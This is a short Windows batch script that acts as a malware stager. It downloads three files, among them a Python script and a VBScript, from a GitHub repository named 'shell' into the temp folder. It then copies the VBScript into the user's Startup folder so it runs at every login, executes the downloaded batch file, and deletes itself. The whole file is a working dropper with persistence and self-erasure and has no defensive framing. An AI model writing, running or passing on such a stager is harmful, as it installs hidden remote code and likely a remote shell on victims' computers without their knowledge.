@echo off
curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/0x2034/shell/main/post.vbs -o "%temp%\post.vbs"
copy "%temp%\post.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
call "%temp%\pro.bat"
del "%~f0"
